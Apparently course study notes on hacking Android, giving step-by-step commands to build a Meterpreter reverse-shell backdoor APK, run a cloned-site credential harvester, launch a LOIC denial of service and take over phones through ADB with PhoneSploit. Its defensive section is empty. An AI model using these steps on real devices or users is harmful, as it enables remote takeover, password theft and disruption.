# 17. Hacking Mobile Platforms

Android has a stack of software components categorized into six sections:
- System Apps, 
- Java AP Framework, 
- Native C/C++ Libraries, 
- Android Runtime, 
- Hardware Abstraction Layer (HAL) 
- Linux kernel and five layers


## Hack

### Create Binary Payloads
  1. ``` service postgresql start ```
  2. ``` msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=[Attacker IP] R > Desktop/Backdoor.apk ```
  3. ``` msfconsole ```\
     ``` use exploit/multi/handler ```\
     ``` set payload android/meterpreter/reverse_tcp ```\
     ``` set LHOST 10.10.10.13 ```\
     ``` exploit -j -z ```
  4. On android, install Backdoor.apk
  5. See "Meterpreter session 1 opened"
  6. ``` sessions -i 1 ```
  7. ``` sysinfo ```
  8. ``` cd /sdcard ``` pwd, shows "/storage/emulated/0"
  9. ``` ps ``` view the processes running in the system.

### Harvest users’ credentials using the Social-Engineer Toolkit
  
   The toolkit attacks human weakness, exploiting people’s trust, fear, avarice, or helping natures.
   
   1.  ``` cd setoolkit && ./setoolkit ```
   2.  Social-Engineering Attacks
   3.  Website Attack Vectors
   4.  Credential Harvester Attack Method
   5.  Site Cloner
   6.  Make victim to visit the cloned site and enter passwords.

### DoS Attack
  Low Orbit Ion Cannon (LOIC)

  Low Orbit Ion Cannon LOIC_v1.3.apk 

### Exploit the Android Platform through ADB using PhoneSploit
  
  1. ``` cd PhoneSploit ```
  2. ``` python3 -m pip install colorama ```
  3. ``` python3 phonesploit.py ```
  4. ``` select [3] Connect a new phone ```
  5. Get shell command line of the phone.
  6. ``` [7] Screen Shot a picture on a phone ```
  7. ``` [14] List all apps on a phone ```
  8. ``` [15] Run an app ```
  9. ``` [18] Show Mac/Inet ```
  10. ``` [21] NetStat  ```

### Other tools
  - NetCut (http://www.arcai.com), 
  - drozer (https://labs.f-secure.com), 
  - zANTI (https://www.zimperium.com), 
  - Network Spoofer (https://www.digitalsquid.co.uk), and 
  - DroidSheep (https://droidsheep.info)

## Secure
